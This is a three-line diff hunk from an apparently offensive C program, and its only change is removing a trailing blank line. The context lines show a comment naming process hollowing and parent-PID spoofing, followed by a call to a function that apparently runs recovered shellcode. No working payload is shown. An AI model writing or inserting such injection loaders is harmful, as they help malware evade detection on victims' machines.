@@ -341,4 +341,3 @@ int main()
     //process hollowing + ppid spoofing
     howlow_sc(recovered);
 }
-
